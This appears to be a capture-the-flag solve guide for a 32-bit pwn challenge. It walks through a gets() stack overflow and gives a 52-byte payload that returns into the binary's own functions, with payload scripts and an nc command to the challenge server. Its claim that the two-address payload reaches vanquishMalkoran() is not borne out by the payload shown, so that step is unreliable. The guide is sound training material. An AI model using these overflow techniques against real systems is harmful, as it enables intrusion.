# Solve.md

# [Easy] Pwn - The Break Of Dawn - Solve Guide

## Overview

The Break Of Dawn is a simple 32-bit pwn challenge themed around The Elder Scrolls.

The binary contains a stack-based buffer overflow in the `getPlayerAction()` function. By overflowing the local buffer, the player can overwrite the saved return address and redirect execution into useful functions already present in the binary.

The intended exploit chains together the following functions:

1. `touchBeacon()`
2. `learnShout()`
3. `vanquishMalkoran()`

Optionally, the chain can return into `exit()` afterwards to terminate cleanly.

When executed in the correct order, these functions activate the questline, decode the hidden command string, and execute it with `system()` to print the flag.

## Initial Analysis

Running the binary presents the player with an Elder Scrolls themed prompt:

```text
Hey, you. You're finally awake...

Adventurer's Inventory:
|Dwarven Sword| |2x Potion Of Minor Healing| |11x Skoomer| |5x Nirnroot| |Sweet Roll| |The Lusty Argonian Maid Vol 1| |Goat Cheese Wheel|

*Opens Chest* (loot all y/n)
```

The source code reveals the vulnerable function:

```c
void getPlayerAction()
{
        puts("\n\n*Opens Chest* (loot all y/n)");
        char buffer[40];
        gets(buffer);
        if (*buffer == 'y')
        {
                puts("\n+ 50 gold");
                puts("+ Bowl (Wooden)");
                touchBeacon();
        }
        else if (*buffer == 'n')
        {
                puts("\nYou never should have come here... Maybe I should go back to the College of Winterhold and \033[1;31mdisassemble\033[0m this 32-bit tome.\n");
        }
}
```

The issue is the use of `gets(buffer)`. This function performs no bounds checking, allowing input larger than 40 bytes to overwrite data on the stack, including the saved return address.

## Enumeration / Inspection

The binary is 32-bit, and the challenge hints that players should inspect or disassemble it:

```text
Maybe I should go back to the College of Winterhold and disassemble this 32-bit tome.
```

Useful checks include:

```bash
file theBreakOfDawn
checksec --file=theBreakOfDawn
```

Useful disassembly commands include:

```bash
objdump -d theBreakOfDawn
```

or:

```bash
gdb ./theBreakOfDawn
```

The important functions are:

```c
void touchBeacon()
{
        puts("+ Meridia's Beacon");
        meridiasBeacon = 1;
        puts("\033[1;34mA new hand touches the beacon...\033[0m");
}
```

```c
void learnShout()
{
        unsigned char elderScrolls = 0x06;
        unsigned char previousByte = elderScrolls;
        for (int i = 0; i < 13; ++i)
        {
                unsigned char currentByte = thuum[i];
                thuum[i] ^= previousByte;
                previousByte = currentByte;
        }
}
```

```c
void vanquishMalkoran()
{
        if (!meridiasBeacon)
        {
                puts("To enter this dungeon you must \033[1;31mtouch the beacon\033[0m.\n");
                return;
        }
        printf("Casting> %s\n", thuum);
        system(thuum);
}
```

The global variable `meridiasBeacon` must be set before `vanquishMalkoran()` will execute the decoded command.

The encoded byte array is:

```c
static char thuum[] = {
        0x65, 0x04, 0x70, 0x50,
        0x36, 0x5a, 0x3b, 0x5c,
        0x72, 0x06, 0x7e, 0x0a,
        0x00
};
```

After `learnShout()` runs, this decodes to:

```text
cat flag.txt
```

## Method

The exploit requires the player to overflow the buffer and overwrite the saved return address with the address of useful functions in the binary.

The required call order is:

```text
touchBeacon() -> learnShout() -> vanquishMalkoran()
```

The logic is:

1. Overflow the `buffer[40]`.
2. Overwrite the saved return address.
3. Redirect execution to `touchBeacon()` to set `meridiasBeacon = 1`.
4. Return into `learnShout()` to decode the hidden command.
5. Return into `vanquishMalkoran()` to call `system(thuum)`.
6. `system("cat flag.txt")` prints the flag.

The working offset to the saved return address is 52 bytes.

## Exploitation / Decryption / Solution Steps

A payload can be created using:

```text
"A" * 52 + address_of_touchBeacon + address_of_learnShout + address_of_vanquishMalkoran
```

From the provided solve notes, the relevant function addresses are:

```text
touchBeacon()       = 0x0804924c
learnShout()        = 0x080492a8
```

The supplied exploit payload uses:

```bash
python2.7 -c "print 'y' * 52 + '\x4c' + '\x92' + '\x04' + '\x08' + '\xa8' + '\x92' + '\x04' + '\x08'" > sol
```

This payload begins with `y` characters so that the input also satisfies the initial `if (*buffer == 'y')` condition. This causes `touchBeacon()` to be called naturally before the function returns.

The overwritten return address then redirects execution into `learnShout()`, which decodes the hidden command. Execution then continues into the next function in the chain, allowing the challenge to print the flag.

A more explicit ROP-style payload would include all three function addresses:

```python
payload  = b"A" * 52
payload += p32(touchBeacon)
payload += p32(learnShout)
payload += p32(vanquishMalkoran)
```

However, because entering `y` causes `touchBeacon()` to be called during normal program flow, the provided payload only needs to redirect into the later parts of the chain.

## Commands Used

Check the binary:

```bash
file theBreakOfDawn
checksec --file=theBreakOfDawn
```

Disassemble the binary:

```bash
objdump -d theBreakOfDawn
```

Run locally:

```bash
./theBreakOfDawn
```

Build the Docker image:

```bash
docker build -t the-break-of-dawn .
```

Run the Docker image:

```bash
docker run -p 4306:4306 the-break-of-dawn
```

Create the solve payload:

```bash
python2.7 -c "print 'y' * 52 + '\x4c' + '\x92' + '\x04' + '\x08' + '\xa8' + '\x92' + '\x04' + '\x08'" > sol
```

Send the payload to the remote service:

```bash
nc 0.cloud.chals.io 26074 < sol
```

## Scripts Used

A simple Python 2 payload generator:

```python
#!/usr/bin/env python2

payload  = "y" * 52
payload += "\x4c\x92\x04\x08"
payload += "\xa8\x92\x04\x08"

print payload
```

Usage:

```bash
python2.7 solve.py > sol
nc 0.cloud.chals.io 26074 < sol
```

A Python 3 equivalent using `struct.pack()`:

```python
#!/usr/bin/env python3

import struct

def p32(value):
    return struct.pack("<I", value)

touch_beacon = 0x0804924c
learn_shout = 0x080492a8

payload = b"y" * 52
payload += p32(touch_beacon)
payload += p32(learn_shout)

with open("sol", "wb") as f:
    f.write(payload)
```

Usage:

```bash
python3 solve.py
nc 0.cloud.chals.io 26074 < sol
```